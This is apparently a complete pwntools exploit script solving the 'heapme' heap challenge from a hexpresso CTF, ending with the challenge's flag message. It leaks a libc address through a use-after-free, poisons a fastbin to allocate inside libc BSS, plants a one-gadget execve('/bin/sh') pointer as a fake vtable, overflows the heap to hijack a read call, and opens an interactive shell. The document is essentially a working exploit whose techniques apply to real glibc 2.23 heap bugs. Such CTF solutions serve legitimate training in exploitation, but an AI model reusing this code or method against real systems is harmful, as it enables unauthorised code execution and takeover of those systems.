#!/usr/bin/env python2

from pwn import *

# https://www.synacktiv.com/posts/challenges/fic2020-prequals-ctf-write-up.html
# socat TCP-LISTEN:8080,fork,reuseaddr openssl-connect:ctf.hexpresso.fr:4242,cert=client.pem,cafile=server.crt,verify=0

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc-2.23.so')
else:
    DEBUG = True
    libc = ELF('libc-2.23.so')

b = ELF('heapme')
context.log_level = 'info'
context.arch = 'amd64'

###

if DEBUG:
    r = process('./heapme', aslr=True, env={'LD_PRELOAD':'/home/laxa/Documents/Challenges/CTF/hexpresso2k19/libc-2.23.so'})
else:
    r = process('socat stdio openssl-connect:ctf.hexpresso.fr:4242,cert=client.pem,cafile=server.crt,verify=0'.split())

GDB = False
if DEBUG and GDB:
    bps = []
    base = 0x0000555555554000
    params = ''
    for bp in bps:
        params += 'b *{}\n'.format(hex(bp + base))
    gdb.attach(r, params)

def menu():
    global r
    return r.recvuntil('4: Exit\n')

def create_disk(size, index):
    global r
    r.sendline('0')
    r.sendlineafter('[+] Create Disk\n', str(size))
    r.sendline(str(index))
    return menu()

def write_disk(index, data):
    global r
    r.sendline('2')
    r.sendlineafter('write Disk\n', str(index))
    r.sendline(data)
    return menu()

def read_disk(index):
    global r
    r.sendline('1')
    r.sendlineafter('read Disk\n', str(index))
    r.recvuntil('Data: ')
    data = menu()
    return data.split('\n')[0]

def delete_disk(index):
    global r
    r.sendline('3')
    r.sendlineafter('delete Disk\n', str(index))
    return menu()

menu()
create_disk(256, 0)
create_disk(256, 15)
delete_disk(0)
create_disk(256, 0)

data = read_disk(0)
leak = u64(data.ljust(8, '\x00'))

libc_base = leak - 0x3c4b78
log.info('leak: %#x' % leak)
log.info('libcbase: %#x' % libc_base)

# modified fastbin_dup_into_stack
# Goal is to get an alloc into libc BSS
create_disk(48, 2)
create_disk(48, 3)
delete_disk(2)
delete_disk(3)

# this offset points to a p64(0x40) value inside libc.bss where we are going
# to allocate a fastbin of size 0x30
offset = 0x98f

# We perform a modified version of fastbin_dup_into_stack
# we have two 0x30 chunks in the free_list, we overflow the one pointing to the first one
# and replace the pointer to point to leak - offset - 0x8 which is will be considered
# valid by malloc. We then do 2 allocations, the second one will point inside libc.bss
# We can therefore craft a vtable there and overflow the heap as we please using our vtable
p = 'A' * 256 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x41) + 'B' * 48
p += p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x41) + p64(leak - offset - 0x8)
write_disk(15, p)

create_disk(48, 10)
log.info('libc.bss: %#x' % (leak - offset - 0x8))
create_disk(48, 11) # points into libc.bss

# This is the magic gadget we use
# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
# [rsp+0x70] contains the index [1] of the DiskFactory, therefore, we dont use this index
# to satisfy the condition
write_disk(11, p64(libc_base + 0xf1147)) # magic gadget

# Overflowing the heap into disk index [15] with a vtable->read pointing to magic gadget
vtable = leak - offset - 0x8 + 0x10
p = 'A' * 256 + p64(0x110) + p64(0x21) + p64(vtable)
write_disk(0, p)

# Triggering the exploit
r.sendline('1')
r.sendline('15')
r.recvuntil('read Disk\n')
r.recvline()

r.interactive()
r.close()

'''
https://ctf.hexpresso.fr/756875e19d16013c5072b2b6e17804f7

YOU DID IT !!!
Here is the LAST flag.
We hope you enjoyed it ;)
Send us an email here : 5c141765db003a82e9a9978566b6d78f@hexpresso.fr
'''
